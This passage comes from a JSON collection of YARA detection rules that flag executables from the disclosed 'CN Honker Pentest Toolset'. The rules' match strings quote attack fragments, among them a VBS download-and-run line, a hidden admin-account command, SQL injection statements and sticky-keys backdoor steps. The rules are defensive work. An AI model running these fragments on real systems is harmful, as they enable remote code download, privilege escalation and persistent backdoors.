\"http://24hack.com/xyadmin.asp\" fullword ascii\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-23 13:24:41","description":"Sample from CN Honker Pentest Toolset - file shell_brute_tool.exe","minimum_yara":"1.7","name":"CN_Honker_shell_brute_tool_RID317D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d9100ccc8489432b491f187588cf7b96","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_hxdef100_RID2D67 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"BACKDOORSHELL\" fullword ascii\n      $s15 = \"%tmpdir%\" fullword ascii\n      $s16 = \"%cmddir%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 10:30:21","description":"Sample from CN Honker Pentest Toolset - file hxdef100.exe","minimum_yara":"1.7","name":"CN_Honker_hxdef100_RID2D67","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6574c840494aeb244be4a06ed5341386","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GetWebShell_RID2EFD : DEMO EXE FILE HKTL T1077 T1087 T1100 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetWebShell.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1077, T1087, T1100\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo P.Open \\\"GET\\\",\\\"http://www.baidu.com/ma.exe\\\",0 >>run.vbs\" fullword ascii\n      $s5 = \"http://127.0.0.1/sql.asp?id=1\" fullword wide\n      $s14 = \"net user admin$ hack /add\" fullword wide\n      $s15 = \";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them\n}","date":"2015-06-23 11:38:01","description":"Sample from CN Honker Pentest Toolset - file GetWebShell.exe","minimum_yara":"1.7","name":"CN_Honker_GetWebShell_RID2EFD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e72415d4469e9cd7b4fbf1e077524d9d","score":70,"tags":["T1100","T1077","T1087","DEMO","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Cracker_SHELL_RID2F59 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SHELL.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/error1.asp\" fullword ascii\n      $s2 = \"password,PASSWORD,pass,PASS,Lpass,lpass,Password\" fullword wide\n      $s3 = \"\\\\SHELL\" fullword wide\n      $s4 = \"WebBrowser1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 11:53:21","description":"Sample from CN Honker Pentest Toolset - file SHELL.exe","minimum_yara":"1.7","name":"CN_Honker_Cracker_SHELL_RID2F59","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"725197e74af4919e16df721f4b58d988","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_MSTSC_can_direct_copy_RID32D6 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file MSTSC_can_direct_copy.EXE\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:22:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"srv\\\\newclient\\\\lib\\\\win32\\\\obj\\\\i386\\\\mstsc.pdb\" fullword ascii\n      $s2 = \"Clear Password\" fullword wide\n      $s3 = \"/migrate -- migrates legacy connection files that were created with \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}","date":"2015-06-23 14:22:11","description":"Sample from CN Honker Pentest Toolset - file MSTSC_can_direct_copy.EXE","minimum_yara":"1.7","name":"CN_Honker_MSTSC_can_direct_copy_RID32D6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"fb8f3095b24159c6bf1425801e0be147","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_lcx_lcx_RID2DB4 : DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - HTRAN - file lcx.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $s2 = \"=========== Code by lion & bkbll\" ascii\n      $s3 = \"Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n      $s4 = \"-tran   <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s5 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them\n}","date":"2015-06-23 10:43:11","description":"Sample from CN Honker Pentest Toolset - HTRAN - file lcx.exe","minimum_yara":"1.7","name":"CN_Honker_lcx_lcx_RID2DB4","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"fb31d2996245cd3958b7ab631dd01fca","score":70,"tags":["T1090","DEMO","FILE","T1020","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_PostgreSQL_RID2E9B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file PostgreSQL.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&http://192.168.16.186/details.php?id=1\" fullword ascii\n      $s2 = \"PostgreSQL_inject\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-23 11:21:41","description":"Sample from CN Honker Pentest Toolset - file PostgreSQL.exe","minimum_yara":"1.7","name":"CN_Honker_PostgreSQL_RID2E9B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7dcac70ccb9036600f4dfbbe64ae311b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_WebRobot_RID2DEB : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebRobot.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:52:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d-%02d-%02d %02d^%02d^%02d ScanReprot.htm\" fullword ascii\n      $s2 = \"\\\\log\\\\ProgramDataFile.dat\" fullword ascii\n      $s3 = \"\\\\data\\\\FilterKeyword.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-23 10:52:21","description":"Sample from CN Honker Pentest Toolset - file WebRobot.exe","minimum_yara":"1.7","name":"CN_Honker_WebRobot_RID2DEB","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5d65b7bd1f89d17c3f4299c59ac3879c","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Baidu_Extractor_Ver1_0_RID3313 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Baidu_Extractor_Ver1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:32:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"\\\\Users\\\\Admin\" fullword wide\n      $s11 = \"soso.com\" fullword wide\n      $s12 = \"baidu.com\" fullword wide\n      $s19 = \"cmd /c ping \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}","date":"2015-06-23 14:32:21","description":"Sample from CN Honker Pentest Toolset - file Baidu_Extractor_Ver1.0.exe","minimum_yara":"1.7","name":"CN_Honker_Baidu_Extractor_Ver1_0_RID3313","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b227d56319f6d926ef63e9e1c96f5d8a","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_FTP_scanning_RID2F61 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file FTP_scanning.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CNotSupportedE\" fullword ascii\n      $s2 = \"nINet.dll\" fullword ascii\n      $s9 = \"?=MODULE\" fullword ascii\n      $s13 = \"MSIE 6*\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}","date":"2015-06-23 11:54:41","description":"Sample from CN Honker Pentest Toolset - file FTP_scanning.exe","minimum_yara":"1.7","name":"CN_Honker_FTP_scanning_RID2F61","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"dc61afde68d2f40fc81775fa34354e31","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_dirdown_dirdown_RID3114 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file dirdown.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Decompress\\\\obj\\\\Release\\\\Decompress.pdb\" fullword ascii\n      $s1 = \"Decompress.exe\" fullword wide\n      $s5 = \"Get8Bytes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them\n}","date":"2015-06-23 13:07:11","description":"Sample from CN Honker Pentest Toolset - file dirdown.exe","minimum_yara":"1.7","name":"CN_Honker_dirdown_dirdown_RID3114","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"908cf15b45a5a37e5cf6e10144c1f440","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Xiaokui_conversion_tool_RID3463 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Xiaokui_conversion_tool.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"update [dv_user] set usergroupid=1 where userid=2;--\" fullword ascii\n      $s2 = \"To.exe\" fullword wide\n      $s3 = \"by zj1244\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}","date":"2015-06-23 15:28:21","description":"Sample from CN Honker Pentest Toolset - file Xiaokui_conversion_tool.exe","minimum_yara":"1.7","name":"CN_Honker_Xiaokui_conversion_tool_RID3463","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"460b9625969b3082b56fa1714fe52e6b","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GroupPolicyRemover_RID3224 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GroupPolicyRemover.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GP_killer.EXE\" fullword wide\n      $s1 = \"GP_killer Microsoft \" fullword wide\n      $s2 = \"SHDeleteKeyA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}","date":"2015-06-23 13:52:31","description":"Sample from CN Honker Pentest Toolset - file GroupPolicyRemover.exe","minimum_yara":"1.7","name":"CN_Honker_GroupPolicyRemover_RID3224","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"702d419238ff9841698cf170abe08f41","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_WordpressScanner_RID315A : DEMO EXE FILE HKTL OFFICE {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WordpressScanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:18:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, OFFICE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s1 = \"(http://www.eyuyan.com)\" fullword wide\n      $s2 = \"GetConnectString\" fullword ascii\n      $s4 = \"#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-23 13:18:51","description":"Sample from CN Honker Pentest Toolset - file WordpressScanner.exe","minimum_yara":"1.7","name":"CN_Honker_WordpressScanner_RID315A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f8f42be172af03cf8b80ecd8e76d2a42","score":70,"tags":["DEMO","OFFICE","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Htran_V2_40_htran20_RID314C : DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file htran20.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:16:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -slave  ConnectHost ConnectPort TransmitHost TransmitPort\" fullword ascii\n      $s2 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n      $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s4 = \"%s -connect ConnectHost [ConnectPort]       Default:%d\" fullword ascii\n      $s5 = \"[+] got, ip:%s, port:%d\" fullword ascii\n      $s6 = \"[-] There is a error...Create a new connection.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 13:16:31","description":"Sample from CN Honker Pentest Toolset - file htran20.exe","minimum_yara":"1.7","name":"CN_Honker_Htran_V2_40_htran20_RID314C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a21c7eef73ccad5230afa55d8df1b0c9","score":70,"tags":["T1090","DEMO","FILE","T1020","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_DictionaryGenerator_RID3284 : DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file DictionaryGenerator.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"`PasswordBuilder\" fullword ascii\n      $s2 = \"cracker\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3650KB and all of them\n}","date":"2015-06-23 14:08:31","description":"Sample from CN Honker Pentest Toolset - file DictionaryGenerator.exe","minimum_yara":"1.7","name":"CN_Honker_DictionaryGenerator_RID3284","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9e54b083f3d7fc056f95a6cab4dcd533","score":70,"tags":["DEMO","EXE","GEN","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ms11080_withcmd_RID2FF0 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11080_withcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:18:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n      $s3 = \"[>] create pipe error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 340KB and all of them\n}","date":"2015-06-23 12:18:31","description":"Sample from CN Honker Pentest Toolset - file ms11080_withcmd.exe","minimum_yara":"1.7","name":"CN_Honker_ms11080_withcmd_RID2FF0","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"bef6cc93c9187bbc5a92a138cf263a7d","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_Lpk_Sethc_v2_RID313D : DEMO EXE FILE HKTL T1015 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:14:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1015\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s3 = \"2011-2012 T00LS&RICES\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2015-06-23 13:14:01","description":"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v2.exe","minimum_yara":"1.7","name":"CN_Honker_T00ls_Lpk_Sethc_v2_RID313D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f2b9bcdc6295316a723efbe2525ac2c3","score":70,"tags":["DEMO","EXE","T1015","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_HASH_32_RID2CAF : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 09:59:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"[Undefined OS version]  Major: %d Minor: %d\" fullword ascii\n      $s8 = \"Try To Run As Administrator ...\" fullword ascii\n      $s9 = \"Specific LUID NOT found\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them\n}","date":"2015-06-23 09:59:41","description":"Sample from CN Honker Pentest Toolset - file 32.exe","minimum_yara":"1.7","name":"CN_Honker_HASH_32_RID2CAF","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"77443d6628cb4327734abef4422f7742","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_windows_mstsc_enhanced_RMDSTC_RID361C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file RMDSTC.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:41:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"zava zir5@163.com\" fullword wide\n      $s1 = \"By newccc\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2015-06-23 16:41:51","description":"Sample from CN Honker Pentest Toolset - file RMDSTC.exe","minimum_yara":"1.7","name":"CN_Honker_windows_mstsc_enhanced_RMDSTC_RID361C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ad1194c36618063093da7a662c855d4e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_mstsc_MSTSCAX_RID324B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file MSTSCAX.DLL\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:59:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ResetPasswordWWWx\" fullword ascii\n      $s2 = \"Terminal Server Redirected Printer Doc\" fullword wide\n      $s3 = \"Cleaning temp directory\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-06-23 13:59:01","description":"Sample from CN Honker Pentest Toolset - file MSTSCAX.DLL","minimum_yara":"1.7","name":"CN_Honker_sig_3389_mstsc_MSTSCAX_RID324B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cfd023364590a80fdf5c9a6484356a7f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_scanner_RID2FA3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls_scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://cn.bing.com/search?first=1&count=50&q=ip:\" fullword wide\n      $s17 = \"Team:www.t00ls.net\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 330KB and all of them\n}","date":"2015-06-23 12:05:41","description":"Sample from CN Honker Pentest Toolset - file T00ls_scanner.exe","minimum_yara":"1.7","name":"CN_Honker_T00ls_scanner_RID2FA3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"285059811f71b2432b52f9978d1e274a","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GetHashes_RID2E43 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetHashes.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:07:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SAM\\\\Domains\\\\Account\\\\Users\\\\Names registry hive reading error!\" fullword ascii\n      $s1 = \"GetHashes <SAM registry file> [System key file]\" fullword ascii\n      $s2 = \"Note: Windows registry file shall begin from 'regf' signature!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 87KB and 2 of them\n}","date":"2015-06-23 11:07:01","description":"Sample from CN Honker Pentest Toolset - file GetHashes.exe","minimum_yara":"1.7","name":"CN_Honker_GetHashes_RID2E43","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"98ac9a4f9310b810f439fcb3d0beba41","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_hashq_Hashq_RID2F30 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Hashq.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hashq.exe\" fullword wide\n      $s5 = \"CnCert.Net\" fullword wide\n      $s6 = \"Md5 query tool\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}","date":"2015-06-23 11:46:31","description":"Sample from CN Honker Pentest Toolset - file Hashq.exe","minimum_yara":"1.7","name":"CN_Honker_hashq_Hashq_RID2F30","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b83a9109328f3cf293efa2c0924a7a5f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ShiftBackdoor_Server_RID32C0 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Server.dat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:18:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /q /f %systemroot%system32sethc.exe\" fullword ascii\n      $s1 = \"cacls %s /t /c /e /r administrators\" fullword ascii\n      $s2 = \"\\\\dllcache\\\\sethc.exe\" fullword ascii\n      $s3 = \"\\\\ntvdm.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2015-06-23 14:18:31","description":"Sample from CN Honker Pentest Toolset - file Server.dat","minimum_yara":"1.7","name":"CN_Honker_ShiftBackdoor_Server_RID32C0","reference":"Disclosed CN Honker Pentest 